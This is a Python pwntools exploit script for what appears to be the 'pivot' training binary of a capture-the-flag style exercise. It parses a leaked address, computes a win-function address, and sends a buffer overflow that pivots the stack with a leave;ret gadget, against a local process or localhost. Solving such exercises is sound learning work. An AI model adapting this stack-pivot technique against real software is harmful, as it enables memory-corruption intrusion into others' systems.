from pwn import *
from icecream import ic

exe = ELF("./pivot_patched")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000400938
# b *0x0000000000400967
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# # Useful Gadgets
# pop_rax = 0x00000000004009bb
# xchg_rsp_rax = 0x00000000004009bd
# mov_inside_rax_rax = 0x00000000004009c0
# nop_rax = 0x00000000004009c8



ru("pivot: ")
pivot = int(re(14).decode(), 16)
ret2win = pivot + 0x213b71
leave_ret = 0x00000000004008ef
ru(">")
ic(hex(pivot))
payload = b'bbbbbbbb'
payload += p64(ret2win)
sl(payload)

payload = b'a'*32
payload += p64(pivot)
payload += p64(leave_ret)
ru(">")
sl(payload)

i()
